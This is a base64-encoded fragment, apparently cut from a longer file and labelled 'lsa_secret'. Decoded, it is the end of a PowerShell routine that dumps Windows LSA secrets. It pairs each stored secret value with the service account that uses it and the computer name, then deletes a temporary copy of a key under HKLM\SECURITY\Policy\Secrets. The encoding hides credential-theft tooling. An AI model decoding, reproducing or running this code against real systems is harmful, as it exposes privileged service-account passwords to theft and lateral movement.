gICAgICAgICAgICMgR2V0IFNlcnZpY2UgQWNjb3VudAogICAgICAgICAgICAkc2VydmljZSA9IEdldC1XbWlPYmplY3QgLVF1ZXJ5ICJTRUxFQ1QgU3RhcnROYW1lIEZST00gV2luMzJfU2VydmljZSBXSEVSRSBOYW1lID0gJyRzZXJ2aWNlTmFtZSciIC1FcnJvckFjdGlvbiBTdG9wCiAgICAgICAgICAgICRhY2NvdW50ID0gJHNlcnZpY2UuU3RhcnROYW1lCiAgICAgICAgICB9CiAgICAgICAgICBDYXRjaCB7CiAgICAgICAgICAgICRhY2NvdW50ID0gIiIKICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgJGFjY291bnQgPSAiIgogICAgICAgIH0KCiAgICAgICAgIyBSZXR1cm4gT2JqZWN0CiAgICAgICAgJG9iaiA9IE5ldy1PYmplY3QgUFNPYmplY3QgLVByb3BlcnR5IEB7CiAgICAgICAgICBOYW1lID0gJGtleTsKICAgICAgICAgIFNlY3JldCA9ICR2YWx1ZTsKICAgICAgICAgIEFjY291bnQgPSAkQWNjb3VudAogICAgICAgIH0KCiAgICAgICAgICRvYmogfCBTZWxlY3QtT2JqZWN0IE5hbWUsIEFjY291bnQsIFNlY3JldCwgQHtOYW1lPSJDb21wdXRlck5hbWUiO0V4cHJlc3Npb249eyRlbnY6Q09NUFVURVJOQU1FfX0KCiAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICBXcml0ZS1FcnJvciAtTWVzc2FnZSAiUGF0aCBub3QgZm91bmQ6ICRyZWdQYXRoIiAtQ2F0ZWdvcnkgT2JqZWN0Tm90Rm91bmQKICAgICAgfQogICAgfQogIH0KICBlbmQgewogICAgaWYoVGVzdC1QYXRoICR0ZW1wUmVnUGF0aCkgewogICAgICBSZW1vdmUtSXRlbSAtUGF0aCAiSEtMTTpcXFNFQ1VSSVRZXFBvbGljeVxTZWNyZXRzXE15U2VjcmV0IiAtUmVjdXJzZSAtRm9yY2UKICAgIH0KICB9Cn0KCgpsc2Ffc2VjcmV0Cg==
